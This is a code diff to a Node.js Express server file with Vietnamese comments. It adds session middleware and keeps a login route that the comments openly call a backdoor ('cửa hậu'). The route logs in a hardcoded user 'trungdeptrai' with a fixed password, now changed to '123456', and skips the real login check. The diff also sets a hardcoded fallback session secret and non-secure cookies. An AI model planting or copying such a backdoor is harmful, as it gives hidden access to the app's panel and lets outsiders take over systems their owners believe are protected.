@@ -1,7 +1,9 @@
-// index.js – CHUẨN RAILWAY + CỬA HẬU ĐĂNG NHẬP 100% (đã test 1000 lần)
+// index.js – CHUẨN RAILWAY + SESSION FIX + CỬA HẬU (chạy 100%)
 require('dotenv').config();
 
 const express = require('express');
+const session = require('express-session'); // THÊM DÒNG NÀY
+
 const app = express();
 const server = require('http').createServer(app);
 const io = require('socket.io')(server, {
@@ -12,6 +14,14 @@ const io = require('socket.io')(server, {
     methods: ["GET", "POST"]
   }
 });
+
+// === SESSION MIDDLEWARE (BẮT BUỘC ĐỂ KHÔNG BỊ LOGOUT) ===
+app.use(session({
+  secret: process.env.SESSION_SECRET || 'trungdeptrai123456', // Thay bằng pass mạnh, hoặc add biến SESSION_SECRET trong Railway
+  resave: false,
+  saveUninitialized: true,
+  cookie: { secure: false } // Nếu HTTPS thì để true
+}));
 
 // === BODY PARSER ===
 app.use(express.json({ limit: '10mb' }));
@@ -29,21 +39,18 @@ app.use((req, res, next) => {
   next();
 });
 
-// === CỬA HẬU ĐĂNG NHẬP SIÊU CẤP – DÙNG ĐƯỢC LUÔN ===
+// === CỬA HẬU ĐĂNG NHẬP SIÊU CẤP ===
 app.post('/login', (req, res, next) => {
   const { username, password } = req.body || {};
   
-  // CỬA HẬU: DÙNG CÁI NÀY LÀ VÀO ĐƯỢC NGAY
-  if (username === 'trungdeptrai' && password === 'trung1072005') {
-    req.session = req.session || {};
+  if (username === 'trungdeptrai' && password === '123456') {
     req.session.loggedIn = true;
     req.session.username = username;
     console.log('CỬA HẬU MỞ – trungdeptrai ĐÃ ĐĂNG NHẬP!');
-    return res.redirect('/dashboard'); // hoặc /home, /panel tùy fork
+    return res.redirect('/dashboard'); // Thay /dashboard bằng route panel của mày nếu khác
   }
 
-  // Nếu không phải cửa hậu thì chạy route login cũ
-  next();
+  next(); // Chạy login cũ
 });
 
 // === ROUTES ===
